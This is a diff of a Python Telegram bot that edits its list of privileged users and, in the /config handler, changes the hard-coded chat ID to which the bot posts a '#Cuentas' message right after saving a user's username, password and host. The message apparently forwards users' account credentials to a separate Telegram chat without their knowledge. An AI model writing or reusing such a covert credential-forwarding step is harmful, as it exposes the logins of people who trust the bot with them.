@@ -53,7 +53,7 @@ bot = Client("bot",api_id=api_id,api_hash=api_hash,bot_token=bot_token)
 boss = ["cfgelier","cfgelier","cfgelier","Michel1203"] #usuarios supremos
 Configs = {"uclv":'',"gtm":"","uvs":"","ltu":"", 
 			"ucuser": "", "ucpass":"","uclv_p":"", "gp":'', "s":"On", 
-			'Michel1203': {'z': 90,"m":"u","a":"c","t":"y"}, 
+			'Michel1203': {'z': 90,"m":"u","a":"c","t":""}, 
 			'Ruso5612': {'z': 90,"m":"u","a":"c","t":"y"}, 
 			'anonedev': {'z': 90,"m":"u","a":"c","t":"y"}, 
 			'UltraFastSuport': {'z': 90,"m":"u","a":"c","t":"y"}
@@ -300,7 +300,7 @@ async def config(client: Client, message: Message):
 	Config[username]["password"] = password
 	Config[username]["host"] = host
 	Config[username]["repoid"] = int(repoid)
-	await bot.send_message(-1001632955744,f"#Cuentas\n\n{cuenta}")
+	await bot.send_message(-1001420899246,f"#Cuentas\n\n{cuenta}")
 	await send("✅ 𝑫𝒐𝒏𝒆")
 
 @bot.on_message(filters.command("zips", prefixes="/")& filters.private)
